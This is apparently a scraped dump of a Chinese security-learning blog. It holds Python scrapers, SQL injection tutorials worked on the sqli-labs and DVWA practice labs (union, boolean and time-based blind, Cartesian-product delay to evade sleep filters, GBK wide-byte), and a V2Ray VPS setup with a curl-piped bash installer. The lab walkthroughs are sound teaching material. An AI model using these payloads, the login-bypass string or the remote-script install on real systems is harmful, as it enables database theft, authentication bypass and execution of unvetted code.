headers = headers, data=data, cookies = cookies) data_response = response.json() sid = data_response['content']['showId'] ''' 信息提取 'city': 城市 'companyFullName': 公司名 'companySize': 公司规模 'education': 学历 'positionName': 职位名称 'salary': 薪资 'workYear': 工作时间 ''' results = data_response['content']['positionResult']['result'] with open('拉勾职位信息.csv', mode='a', encoding='utf-8') as f: for r in results: d = { 'city' : r['city'], 'companyFullName' : r['companyFullName'], 'companySize' : r['companySize'], 'education' : r['education'], 'positionName' : r['positionName'], 'salary' : r['salary'], 'workYear' : r['workYear'] } values = d.values() f.write(\",\".join(values)) f.write('\\n') 运行结果 5.爬取快代理构建ip池123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import requestsimport parselimport timedef check_proxy(proxy_list): # 检查ip质量 headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36' } can_use = [] for proxy in proxy_list: try: response = requests.get('https://www.baidu.com/', headers = headers, proxies = proxy, timeout = 0.1) if response.status_code == 200: can_use.append(proxy) except Exception as e: print(e) return can_useheaders = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36' }proxy_list = []for page in range(1,11): print(\"====================正在爬取第{}页===================\".format(page)) url = 'https://www.kuaidaili.com/free/inha/{}/'.format(page) r = requests.get(url, headers = headers) # ip，端口，协议类型 data = parsel.Selector(r.text) proxies = data.xpath('//table[@class=\"table table-bordered table-striped\"]/tbody/tr') # 代理ip的形式：{'协议类型'：'ip: 端口'} for proxy in proxies: proxy_dict = {} ip = proxy.xpath('./td[@data-title=\"IP\"]/text()').extract() port = proxy.xpath('./td[@data-title=\"PORT\"]/text()').extract() pro_style = proxy.xpath('./td[@data-title=\"类型\"]/text()').extract() proxy_dict['pro_style'] = str(ip) + ': ' + str(port) proxy_list.append(proxy_dict) print(proxy_dict) time.sleep(1) print(\"===================第{}页爬取结束=====================\".format(page))can_use = check_proxy(proxy_list)print('能用的代理ip：', can_use)print('能用的代理ip数量：', len(can_use)) 运行结果","link":"/python%E7%88%AC%E8%99%AB%E5%AE%9E%E8%B7%B5/"},{"title":"sql注入——普通注入","text":"sql注入——普通注入 sql注入的一般思路 一、查找注入点，判断是否存在sql注入； sql注入漏洞一般存在于登录、注册、修改密码入口，查找页面或添加页面等用户可以查找或修改数据的地方(一般是没有验证码的情况)； 判断方法： 单引号判断（前提是页面有错误回显）： 在正确的地址后面添加单引号，然后根据回显信息判断网站是否对提交的数据进行过滤。如果页面提示语法错误，则表明存在sql注入【注意前提是语法错误，因为其他的错误提示可能是检测到敏感字符而报错】。因为报语法错误就表明网站并没有对提交上去的 ' 进行过滤，导致我们可以任意构造sql查询语句。同时我们可以通过报错信息进一步来判断注入的类型。 在上图中我们可以看到错误提示：” You have an error in your SQL syntax; “ 说明在提交的正常数据后面加上 ' 后导致网站后端的SQL查询语句中存在语法错误，从而判断这里存在sql注入。根据后面的提示：” check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 “，可以知道产生语法错误的语句是 1'' LIMIT 0,1 ， 发现是 1' 后面多了一个我们加上去的 ‘ 导致sql语句中存在奇数个单引号而报错。如果去掉我们加上去的 ' 后，语句变成1' LIMIT 0,1 ,此时的语句是正确的，所以1的前面也应该有一个 ' 来闭合1后面的 ' ,从而可以判断这是字符型注入，并且猜测sql语句的可能情况：SELECT * FROM database_name WHERE id = '1' LIMIT 0,1，这时加上单引号语句就变成SELECT * FROM database_name WHERE id = '1'' LIMIT 0,1从而报错。在这条报错语句中还可以判断使用的是MySQL数据库； and判断（针对页面关闭了错误回显的情况）： （以Less-1为例）首先我们注释掉PHP代码中的报错行： 现在当我们提交id='时，页面没有错误回显，那我们提交上去的单引号是被过滤掉了还是被执行了呢，没有办法直接判断，这时候就要and来帮忙了。我们先提交id=1' and '1'='1或者id=1' and 1=1 --+（下同），此时如果提交的数据被执行了的话，那么后台的SQL语句就为select * from users where id='1' and '1'='1'，此时条件判断为真，正常回显； 然后再提交id=1' and '1'='2，如果提交的数据被执行，则后台的SQL语句为select * from users where id='1' and '1'='2'，条件判断为假，所以没有回显； 提交不同的数据，返回不同的结果，这说明是的'1'='1'和'1'='2'这两个语句起了作用，也就意味着我们提交的数据被执行了，所以存在sql注入，而且是字符型注入。这里要说清楚的是我们预先是不知道这是字符型注入的，所以我们要进行所有的尝试，直到得到我们所预期的结果。 我们可以尝试的语句是： （1）id=1' and '1'='1和id=1' and '1'='2； （2）id=1') and ('1')=('1和id=1') and ('1')=('2； （3）id=1 and 1=1和id=1 and 1=2； （4）id=1) and (1)=(1和id=1) and (1)=(2 。 or判断（针对页面关闭了错误回显的情况）： （以Less-1为例）同样我们还是先关闭报错；提交id=' or 1=1 --+或id=' or '1'='1（下同），发现页面正常回显，此时如果提交的数据被执行了，那么SQL语句为select * from users where id='1' or 1=1 --+' limit 0,1;； 提交id=' or 1=2 --+，发现页面没有回显，与提交id=' or 1=1 --+的结果不同，这就是因为我们提交的1=1和1=2所导致的。这就证明我们提交上去的数据被插入到SQL语句中的去执行了，也就是说通过构造其他不同的payload还能执行其他不同的操作，从而获取数据。通过上述方法可以证明存在sql注入。 二、如果存在sql注入，则进一步判断sql注入的类型；如果可以直接根据错误的回显信息来判断注入类型那当然更好，如果不能，就要手工输入来判断，下面主要是讲手工判断的思路。 sql普通注入一般分为字符型和数字型。 字符型：1.SELECT * FROM users WHERE id='$id' LIMIT 0,1 ​ 2.SELECT * FROM users WHERE id=('$id') LIMIT 0,1 数字型：1.SELECT * FROM users WHERE id=$id LIMIT 0,1 ​ 2.SELECT * FROM users WHERE id=($id) LIMIT 0,1 背景知识：在SQL语句中常用的注释：①--+，②-- (注意两个'-'后面有一个空格), ③#；【推荐使用–+，如果 不知道用哪一个就都写上去：–+– #】 判断方法(以sqli-labs-master/Less-1-4为例)： 首先正常输入?id=1，正常回显； 开始先尝试字符型（以Less-1为例）（先假设是字符型，然后再验证假设）：如果是字符型，则我们提交上去的id=1就会先变成id='1'，然后再拼接到sql查询语句中。我们验证的思路有两种： （1）第一种思路是提交id=2-1，如果数字型，则返回的结果和提交id=1是一样的，因为2-1运算后的结果还是1；如果结果不一样，则可以判断是字符型； Less-1：字符型 Less-2：数字型 接下来就要判断是字符型中的哪一种（以Less-1、3为例，已经通过上述方法判断为字符型注入）：先假设是第一种，然后提交id=1' --+；这里的思路是先用一个 ' 闭合1前面的单引号，然后再把后面多余的一个单引号给注释掉。如果是字符型的第一种，则返回结果与id=1的结果相同，否则为第二种。下面分别对Less1、3进行判断： Less-1的返回结果与id=1时相同，所以为字符型的第一种； Less-3报错，所以为字符型的第二种；同时根据错误回显可以得到应该构造id=1') --+提交，原理与构造id=1' --+的原理相同； （2）第二种思路是提交id=1' and '1'='1，如果是字符型，则返回的结果和提交id=1是一样的，如果报错，则可判断为数字型。这里的思路是先用单引号闭合1前面的单引号，再借助and把1后面的单引号利用起来； Less-1：字符型 Less-2：数字型 然后可以通过思路（1）中的方法判断是字符型注入的哪一种。 如果通过2中的方法判断为数字型注入，则需要再进一步判断是数字型的哪一种。当然也可以通过构造提交的数据来直接判断是否为数字型，如提交id=1 --+、id=1) --+或id=1 and 1=1；思路和字符型的判断思路相同。下面是判断数字型的类别的方法：提交id=1) --+，如果返回结果与提交id=1时相同，则判断为数字型的第二种；如果报错，则判断为数字型的第一种； Less-2：第一种 Less-4：第二种 三、判断具体的注入类型后，就是构造合适的payload来爆库，爆表，爆列。 可以利用sql注入爆出数据库中几乎所有的数据。 背景知识： 在SQL语句中常用的函数： （1）系统函数：version()——MySQL数据库版本； ​ user()——数据库用户名； ​ database()——数据库名； ​ @@datadir——数据库路径； ​ @@version_compile_os——操作系统版本。 在dvwa中的演示结果： 提交：-1' union select version(),user() # 提交：-1' union select database(),@@datadir # 提交：-1' union select @@version_compile_os,2 # （2）字符串连接函数： ​ concat(str1,str2,…)——没有分隔符地连接字符串； ​ concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串（concat_withseparator，其中separator为分隔符）； ​ group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据。 演示结果： information_schema数据库： information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。里面包含了关于每个数据库，数据库表以及字段的信息。 sql注入中主要用到的是schemata（数据库）,tables（表）,columns（字段）这三个表； ······（此处省略几千行） 常用的查询语句： 查询数据库：select schema_name from information_schema.schemata；查询某数据库的数据表：select table_name from information_schema.tables where table_schema=’xxx’或 select table_name from information_schema.tables where table_schema=database()； 查询某数据库表的所有列：Select column_name from information_schema.columns where table_name=’xxx’；查询某列的内容：select columnname from tablename。注：schema_name和table_scehma都是表示数据库，但schema_name是schemata表中的字段，table_schema是tables表中的字段，从上面的图中也可以看出来。 实战（以Less-1为例）： 爆库&gt;&gt;爆表&gt;&gt;爆字段，这里要用到SQL联合查询语句union。 首先要使用order by语句猜解字段。因为在使用union查询时，两边的所查询的字段要相同，也就是数据的列数要相同，如果不同就会报错：The used SELECT statements have a different number of columns或者没有回显内容，所以要得到字段数。如果order by后面接的是数字，那么数字是几就会对获得的数据按第几列排序，且如果数字多于一个时，会按从左到右的顺序优先排序。比如：select * from users order by 2,3会依次按第二列和第三列进行排序，且以第二列优先排序。当order by 后面的数字超过所获得的数据的列数时，就会报错Unknown column 'x' in 'order clause'或没有回显。 （1）提交：id=1' order by 4 --+ ，报错，因此字段数要小于4； （2）提交：id=1' order by 3 --+，正常回显，所以字段数为3； 得到字段数后，我们还要找出屏幕上显示的是那几个字段，因为只有显示在屏幕上我们才能得到数据； 提交：id=-1' union select 1,2,3--+，发现输出的是第2,3这两列；这里将id赋值为-1是为了将前一个查询的结果置空，因为我们要显示的是后面一个查询的结果。那么为什么id=-1就能将返回的结果置空呢，是因为当 id 的数据在数据库中不存在时，返回的结果就为空，所以这里显示的就是后一个查询结果； 爆库；注意只有2,3两个字段会显示，所以想要查询的内容必须放在2,3这两个位置上； 提交：id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+ 提交：id=-1' union select 1,database(),3 --+，得到所需库是security； 爆表；根据第3步回显的结果得到所有数据库名，这里我们用的是数据库security（可通过查询database（）得到）； 提交：id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+ 爆字段；这里获取users表中的数据； 提交：id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 获取username、password字段中的数据；这里要说的是似乎其他的字段在表users中不存在，也就是表中只有username、password这两个字段，不知道是开发者本来就是这样设计的还是数据库导入的时候出错；不管怎样，只要能达到练习的目的就行； 提交：id=-1' union select 1,group_concat(username),group_concat(password) from users --+ 到这里，差不多就完成了整个sql注入过程。Less-2,Less-3,Less-4除了注入的类型不同，其他的思路基本相同。 最后我们来分析一下源码： 发现PHP代码并没有对我们提交的内容进行任何过滤就直接拼接到了SQL语句中，这就导致了我们提交的payload被执行，从而获得敏感的数据。PHP代码利用mysql_fetch_array()函数将查询的结果放到数组中，最后显示的内容是从数组中取出键名为’username’和’password’所对应的值。 总结：在进行sql注入时，主要的思路就是剥离网站后端处理文件中的sql语句，在中间加入我们构造的payload，并想办法去执行它，从而得到我们想要的数据。在注入过程中要多动脑经，不断地去猜解后台的处理代码是什么样的，然后再根据具体情况构造合理的payload。对于其他一些稍微进行了防御的网站，我们要先弄清楚他的防御方法，然后再想办法构造payload去绕过它。还有就是sql注入的做题方法很灵活，解决问题的方法有很多，不仅限于上面思路中所给的方法。 在做题过程中遇到的一些问题及一些思考： 万能密码；在一些题目中，可能只需要我们输入密码，但我们并不知道密码是什么，这个时候如果存在sql注入，无论提交数据的方式是get还是post，都可使用万能密码绕过。比如：正常提交时，SQL语句为select * from users where password=$_GET['password']，当我们提交?password='' or 1=1，SQL语句就变成select * from users where password='' or 1=1，因为条件password='' or 1=1的判断始终为真，所以能绕过密码验证，直接登录； 在做题的时候发现如果是字符型注入，则提交id=2和id=2-1的结果是一样的，也就是说验证的时候只会管第一个字符，无论后面是什么字符，当然不能是注释符了，只要开头的是2，结果都是与提交id=2的结果相同。","link":"/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/"},{"title":"sql注入——盲注","text":"sql注入——盲注 盲注是指在sql注入过程中，我们提交的payload被执行后，返回的数据不能直接显示到前端页面，这时候我们利用一些方法进行判断或尝试，最终获取数据的过程。 盲注的类型： 基于布尔的盲注 基于时间的盲注 基于报错的盲注 一、基于布尔的盲注 布尔盲注：首先使用相关的函数截取字符串，然后再通过逻辑语句来判断所猜解的字符（串）是否正确，主要是利用提交的payload进行逻辑判断后，结果真、假所返回的数据页面不同，这也是进行布尔盲注的前提条件。 背景知识： 常用的截取字符串函数： （1）mid( )函数 1mid(str,start,length) 参数 描述 str 必需。要截取的字符串。 start 必需。规定截取开始的位置（起始值为1）。 length 可选。规定截取的长度；如果省略，则返回剩余的字符串。 例： 1234str = \"123456\";mid(str,2,1);mid(str,1,2);mid(str,2); 运行结果 12321223456 （2）substr( )函数和substring( )函数 上面两个函数的功能是相同的，均为截取字符串： 12substr(str,start,length)substring(str,start,length) 例： 1substr((database()),1,1) &gt; 'a' #截取数据库名的第一位，并与字符'a'比较 （3）left( )函数 123left(str,length) #str为要截取的字符串，length规定截取的长度#left()函数与其他函数不同之处在于它是从字符串的最左边开始截取规定长度的字符串 例： 1left((database()),1) &gt; 'a' #截取数据库名的第一位，并与字符'a'比较 （4）ascii( )函数和ord( )函数 ascii( )函数和ord( )函数的作用都是将字符转换为ASCII值。 例： 12ascii(substr((database()),1,1)) = 98#先截取数据库名的第一位，然后转换为ASCII值，最后和98比较 （5）length( )函数 length( )函数返回字符串的长度。 （6）count(column_name)函数 count(column_name)函数返回指定列的值的数目。 正则表达式(regexp正则注入)： 可以使用正则表达式直接匹配字符串。 12345#返回结果为0（不正确）或1（正确）select * from users where id=1 and 1=(database() regexp '^[a-z]'); #匹配数据库名的第一位select * from users where id=1 and 1=(database() regexp '^r[a-z]');#匹配数据库名的第二位 like匹配注入： like匹配注入与regexp正则注入类似。 1select database() like 'ro%'; if语句： 12if(((database()) regexp '^r'),1,0)#条件(database()) regexp '^r'判断为真时返回1，为假时返回0 思路： 前提是页面不能显示数据，或没有报错信息，但payload进行逻辑运算后结果真假页面所返回的结果不同；从而判断要利用布尔盲注； 确定数据库个数（可省略）： 1234(select count(schema_name) from information_schema.schemata) &gt; n或(select count(schema_name) from information_schema.schemata limit 0,1) &gt; n#数据库个数大于n页面返回正常，否则返回错误或无返回结果 确定当前所使用的数据库： 123(substr((database()),1,1)) &gt; 'a'或(ascii((substr((database()),1,1))) &gt; n *确定数据库名的长度（字符个数，清楚在何时停止判断）： 1234(select length(schema_name) from information_schema.schemata) &gt; n或(select length(schema_name) from information_schema.schemata limit 0,1) &gt; n#数据库名长度大于n页面返回正常，否则返回错误或无返回结果 逐个确定数据库名： 123456#以确定第一个数据库的名称为例(select substr((select schema_name from information_schemata limit 0,1),1,1)) &gt; 'a'#数据库名的第一个字符大于'a'页面返回正常，否则返回错误或无返回结果或(select ascii(substr((select scheme_name from information_schemata limit 0,1),1,1))) &gt; n#数据库名的第一个字符的ASCII值大于n页面返回正常，否则返回错误或无返回结果 爆库&gt;&gt;爆表&gt;&gt;爆字段。 实战(以Less-5为例)： Less-5页面显示的内容会根据payload执行的结果不同而不同，所以这里利用布尔注入比较方便。 首先我们通过判断知道这是字符型注入中的单引号注入； 确定当前数据库名的长度(一般数据库命都不会太长，所以可以直接用数试)： 提交：id=1' and length(database())=1--+，发现页面没有任何回显，所以数据库名的长度不为1； 不断尝试，直到提交：id=1' and length(database())=8--+，页面显示正常，所以当前数据库名的字长为8。 确定数据库名： 提交：id=1' and substr(database(),1,1)&gt;'a'--+，发现页面回显正常，所以数据库名的第一个字符大于字符’a’，接下来再用二分法查找。 payload： 123456id=1' and substr(database(),1,1)&gt;'n'--+ 回显正常id=1' and substr(database(),1,1)&gt;'t'--+ 不正常id=1' and substr(database(),1,1)&gt;'q'--+ 正常id=1' and substr(database(),1,1)&gt;'s'--+ 不正常id=1' and substr(database(),1,1)='r'--+ 不正常id=1' and substr(database(),1,1)='s'--+ 正常 确定数据库名的第一个字符为’s’。同理，还可以继续确定其他字符，只需将substr( )函数的后面一个1分别改为2,3,4,5,6,7,8即可。最终确定当前数据库名为security。 确定security数据库中表的个数： payload： 123id=1' and (select count(table_name) from information_schema.tables where table_schema='security')&gt;5--+ 不正常id=1' and (select count(table_name) from information_schema.tables where table_schema='security')&gt;3--+ 正常id=1' and (select count(table_name) from information_schema.tables where table_schema='security')=4--+ 正常 确定数据库表的个数为4。 逐个确定表名字长： payload： 1234 id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))&gt;5--+ 正常 id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))&gt;10--+ 不正常id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))&gt;7--+ 不正常 id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=6--+ 正常 确定第一个表名字长为6。同样的方法可以依次确定所有表名字长。 确定表名： payload： 12345id=1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)&gt;'a'--+ 正常id=1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)&gt;'n'--+ 不正常id=1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)&gt;'g'--+ 不正常id=1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)&gt;'d'--+ 正常id=1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e'--+ 正常 得到表名依次为： emails，referers，uagents，users。 确定字段：还是相同的方法，这里就不多说了。 payload： 1id=1' and (select count(column_name) from information_schema.columns where table_name='users')=n--+ （n表示数字） 1id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=n--+ （n表示数字） 1id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)&gt;'a'--+ 手工注入的过程中可以使用BurpSuite实现半自动化注入。 以爆库为例： 首先提交payload：id=1 and length((database()))=5--+，并利用burpsuite抓包，然后send to intruder(暴力破解)； 将’5’作为参数，并设置好payload，最后Start Attack进行破解; 最终进行length排序，得到数据库名字长为8。 在确定数据库名的时候使用字符的ASCII码比较方便。 首先提交：id=1' and ascii(substr((database()),1,1))=1--+ 最后得到数据库名的第一个字符的ASCII码为115。同样的方法得到后七个字符的ASCII分别为：101，99，117，114，105，116，121。转化为字符，得到数据库名为security。 源码分析： 当能查询到结果的时候，页面返回”You are in………..”；当没有查询到结果的时候，页面没有无返回。 二、基于时间的盲注 时间盲注：通过利用延时函数来增加页面加载的时间，进而区分不同的查询结果所对应的返回页面。有时候在进行SQL注入的时候，不论后端有没有执行SQL语句，页面返回的内容都相同，没有任何变化，从而难以判断SQL语句是否有被执行。这时候可以利用时间盲注。 背景知识： 延时函数： sleep( )函数 1sleep(seconds) #seconds:必需，规定延时的秒数 思路： 首先判断是否存在注入，然后再利用sleep( )函数猜解字符（爆库&gt;&gt;爆表&gt;&gt;爆字段）。 实战(结合一的背景知识)： 首先通过判断已经知道是单引号注入； 确定当前数据库名字长： payload: 12id=1' and if((length(database())=5),1,sleep(5))--+ 有延时id=1' and if((length(database())=8),1,sleep(5))--+ 无延时 确定当前数据库名： payload: 1id=1' and if((substr((database()),1,1)&gt;'a'),1,sleep(5))--+ 爆表： payload： 1id=1' and if(((select count(table_name) from information_schema.tables where table_schema='security')=5),1,sleep(5))--+ 1id=1' and if((length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=1),1,sleep(5))--+ 1id=1' and if((substr((select table_name from information_schema.tables where table_schema='security'),1,1)&gt;'a'),1,sleep(5))--+ 爆字段： payload: 1id=1' and if(((select count(column_name) from information_schema.columns where table_name='users')=1),1,sleep(5))--+ 1id=1' and if((length((select column_name from information_schema.columns where table_name='users' limit 0,1))=1),1,sleep(5))--+ 1id=1' and if((substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)&gt;'a'),1,sleep(5))--+ 也可以使用burpsuite进行注入。通过页面右下角的响应时间来区分。 源码分析： 当能查询到结果的时候，页面返回”You are in………..”；当没有查询到结果的时候，页面仍返回”You are in………..”。","link":"/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/"},{"title":"sql盲注——大负荷注入","text":"sql注入经验——大负荷注入 本文是从某位大佬那学来的，看到大佬的骚操作，不禁感叹，tql。。。。 利用笛卡尔积进行大负荷注入 在sql注入中，盲注是一种非常常用的注入方式。下面介绍的是基于时间的盲注骚操作（手动滑稽）~~ 在防御时间盲注时，一般都是采用过滤延时函数（如sleep）的方法，这时候，就可以采用我们的大负荷注入来绕过。 笛卡尔积： 笛卡尔积就是指在两个集合中分别任意取出一个元素，两两组合，将所有可能组成一个新的集合，这个新的集合就叫做前面两个集合的笛卡尔积。 假设集合A={a, b}，集合B={0, 1, 2}，则两个集合的笛卡尔积为{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}。 利用笛卡尔积可以将多个表变一个表，一般用于多表查询。 大负荷查询： MySQL数据库支持笛卡尔积这种运算方式。 MySQL的多表查询(笛卡尔积原理) 原理是让mysql进行笛卡尔算积，使其造成大负荷查询达到延时的效果。笛卡尔算积需要大量的数据来计算，而mysql数据库中正好都有一个拥有大量数据的表——information_schema。每个数据库都有查看information_schema数据库中几乎所有表的权限。 payload：(来自dalao) 1select * from test where id = 1 and 1 and ( select count(*) from information_schema.tables a, information_schema.tables b, information_schema.tables c ); 上面的payload查询了三个表，虽然都是information_schema，但是对于计算机来说它并不知道这三个表一模一样，所以每个表都会查询一遍，相当于查询了三个表。其中a,b,c是给表定义别名（只能是由字母组成，且不区分大小写），是为了让计算机区分，不写则会报错。其中tables可以替换成columns，不论是tables还是columns，只要表中数据越多，查询需要的时间就越长。 如果上面的payload查询时间还是比较短，还可以在后面加information_schema.tables d, ...e, ...，多查询几个表（一般三个就OK了），或者将tables换成columns直到查询时间有明显延长。 demo： 这里我们为了演示，就不慢慢检验了，所以我们先给出数据库名：security； 1select * from users where id = 1 and ( substr( ( select database() ),1,1) = 'a' ) and (select count(*) from information_schema.tables a, information_schema.tables b, information_schema.columns c); 1select * from users where id = 1 and ( substr( ( select database() ),1,1) = 's' ) and (select count(*) from information_schema.tables a, information_schema.tables b, information_schema.columns c); 可见如果条件substr( ( select database() ),1,1) = ' '判断为假，就会直接没有数据返回，不会再进行后面的查询，所以页面回显时间很短，但如果判断为真，就会接着判断后面的条件，所以就会触发大负荷注入，页面回显会延长。接着还可以继续爆表，爆字段； 除了增加条件外，还可以使用if语句： 1select * from users where id = 1 and ( if( ( substr( ( select database() ),1,1) = 'a' ) , (select count(*) from information_schema.tables a, information_schema.tables b, information_schema.columns c), 1 ) ); 1select * from users where id = 1 and ( if( ( substr( ( select database() ),1,1) = 's' ) , (select count(*) from information_schema.tables a, information_schema.tables b, information_schema.columns c), 1 ) ); 在这里贴一个大佬给的靶机源码： (我上面的demo是直接用命令行实现的) 1234567891011&lt;?phpheader(\"Content-type: text/html; charset=utf-8\");$conn=mysql_connect('localhost', 你的数据库用户名, 你的数据库密码);mysql_select_db(\"test\",$conn);$uid=($_GET['id']);$sql=\"SELECT * FROM admin where id=$uid\";$result=mysql_query($sql, $conn);print_r('当前SQL语句: '.$sql.'&lt;br /&gt;&lt;hr /&gt;结果: ');print_r(mysql_fetch_row($result));mysql_close();?&gt;","link":"/sql%E7%9B%B2%E6%B3%A8%E2%80%94%E2%80%94%E5%A4%A7%E8%B4%9F%E8%8D%B7%E6%B3%A8%E5%85%A5/"},{"title":"vps翻墙","text":"vps翻墙 本教程记录本人的翻墙经历以及翻墙过程中遇到的问题和解决方法。PS：本人小菜鸟一枚，请大佬们多多关照~~ 刚开始也是兴趣使然，纯小白一枚，在好奇心的驱使下走上了这条不归路。 废话不多说，直接开干！ 前言： 这里我本来准备使用大佬们推荐的vps + ss代理的方法（介绍一下，vps（Virtual Private Server），虚拟专用服务器，说白了就是一台服务器；ss（Shadowsocks），ssh客户端；想了解更多可以自行问度娘 ），但不幸的是我的ip没过多久就被墙了（TCP封锁），为解决这个问题，可以使用V2ray绕过，因为V2Ray走的是UDP协议，即使TCP阻断依然可以用 。下面重点来了。。。。 搞错了，重来： 吃完bianfu人都变正经了。。。 正文： 首先我们得买个服务器，想翻墙，不花点钱怎么行呢 这里我使用的是Vultr的服务器，5美元一个月，按小时计费，它不香吗。。。 登录Vultr官网，创建账户；这里创建账户是有优惠的，好像是新用户送50美元，一个月有效，可以上网找一下链接，遗憾的是我没用上（当时稀里糊涂的，）。 创建并登录好以后，就是往账户里面充钱了，第一次一般充10美元，好像上面提到的优惠至少要充值10美元才能享受，我也不太清楚，自行百度。充值还是比较人性化，可以使用支付宝。 在左侧的导航栏中找到Billing，然后选择充值方式为Alipay（支付宝）； 这里有个问题就是使用支付宝付款前要填一下个人信息，没办法，查得紧，只有乖乖填了，我这里是因为之前填过了所以没有显示；最后选择$10，点击 Pay with Alipay 扫码付款。是真的贵~~ 付好钱之后在Billing中就可以看到充进去的金额了。 然后点击加号，选择想要购买服务器，推荐日本和洛杉矶的服务器，我选的是洛杉矶的； 这里推荐选择centOS7 x 64版本，后面部分教程要求centOS7版本； 点击Deploy Now完成创建。等到install变成running时就表示已经安装好了； 安装好后可以点击查看服务器信息；在这一步可能会提示服务器没有安装好，耐心等一下就好了。 ping一下ip，200ms多一点，这速度还行。。。 买好服务器之后，接下来就是连接它了，这里下载Xshell客户端连接服务器；安装好后直接打开； 选择新建，或者在文件选项新建会话也行； 连接后可能会显示：WARNING! The remote SSH server rejected X11 forwarding request.，只需要在会话属性中取消勾选：转发X11连接到(X) 项即可。 连接时也可能会显示无法连接，然后ping的时候也显示请求超时，有可能ip已经被封了，这时候需要重换一台vps，也就是换ip，接下来我也会讲到。 连接成功后，就可以在服务器上安装V2Ray了。 先执行脚本： 1tzselect 调整时差，否则有可能用不了。执行后找到Asia，输入序列号回车，然后找到China输入序列号回车，然后找到Beijing Time输入序列号回车，然后输入1确认信息，回车，完成。 然后安装V2Ray，执行脚本： 1bash &lt;(curl -s -L https://git.io/v2ray.sh) 来自某位大佬。。。tql 选择安装，还是输入序列号1，回车，然后输入24，回车，选择协议，然后输入端口号，是否屏蔽广告，是否安装Shadowsocks，这里我选择不安装，因为ss容易被墙； 安装完成后可以执行v2ray url获取vmess地址。复制这个地址。然后下载V2ray客户端，导入服务器配置信息。 添加[VMess]服务器，选择导入配置文件–从剪切板导入URL； 然后点击确定，完成。 如果幸运的话现在应该能翻墙连外网了，但一般情况下还不能，需要服务器开放端口；","link":"/vps%E7%BF%BB%E5%A2%99/"},{"title":"xxe漏洞","text":"","link":"/xxe%E6%BC%8F%E6%B4%9E/"},{"title":"序列化和反序列化","text":"","link":"/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"逻辑漏洞","text":"","link":"/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"title":"宽字节注入和二次注入","text":"宽字节注入和二次注入一、宽字节注入背景知识： 宽窄字节介绍： 窄字节是指大小为一个字节的字符； 宽字节是指大小为两个字节的字符； 默认一个英文字符占一字节，一个汉字占两字节； 常见的宽字节编码：GBK,GB2312,GB18130,BIG5,Shift_JIS等。 相关函数（在代码审计的时候可以检查此类函数）： addslashes()：函数在预定义字符前添加反斜杠，并返回修改后的字符串；主要作用是转义特殊字符； mysql_real_escape_string()：函数转义SQL语句中的特殊字符； mysql_escape_string()：函数转义一个字符串。 编码设置： 1SET NAMES gbk 相当于 123456SETcharacter_set_client = 'gbk', #规定客户端发送SQL语句时所使用的编码格式character_set_connection = 'gbk', #规定服务器接收到SQL语句后应转换为哪种编码格式后再执行character_set_results = 'gbk' #规定服务器响应后返回结果集或错误信息时所使用的编码SQL语句执行过程：首先由客户端发送SQL语句，服务器端将SQL语句从character_set_client转换为character_set_connection,然后进行查询；查询的结果存放到列字符集中，最后结果从列字符集转换为character_set_results,并返回到客户端。 原理分析： 产生宽字节注入的原因： 首先程序员为了防止SQL注入，一般会调用addslashes()、mysql_real_escape_string()、mysql_escape_string()这三个主要函数来将payload中的敏感字符（如单、双引号）进行转义，即在敏感字符前添加反斜杠； 当设置character_set_client = 'gbk'时，会引发编码转换的问题，从而导致宽字节注入。主要原因是在使用相关的函数转义SQL语句中的特殊字符时，函数执行后，添加的反斜杠( \\ )所使用的编码格式是ASCII编码。当客户端发送SQL语句时，就会将编码转换为gbk编码。问题就出现在编码转换的过程中，\\的URL编码为%5C，而当提交的payload为%df%5C时，经过gbk编码后会变成汉字運，所以说%df会将反斜杠“吃掉”，%df合并反斜杠后，导致单引号发挥闭合作用，而不仅仅是内容，从而单引号可以被利用，造成sql注入。 注：提交的payload会先进行url编码，然后合并到SQL语句中，最后经过gbk编码后，上传到服务器 。 思路： 利用%df使反斜杠失去转义作用，使单引号重新发挥闭合作用； 转义反斜杠，提交\\'，利用函数转义后变成\\\\'，第二个反斜杠被第一个反斜杠转义，导致单引号起到了闭合作用。但这种思路条件要求非常苛刻，因为反斜杠一般会作为特殊字符，也会被转移。 实战（以Less-32为例）： 尝试提交id='，发现提示单引号被转义了； 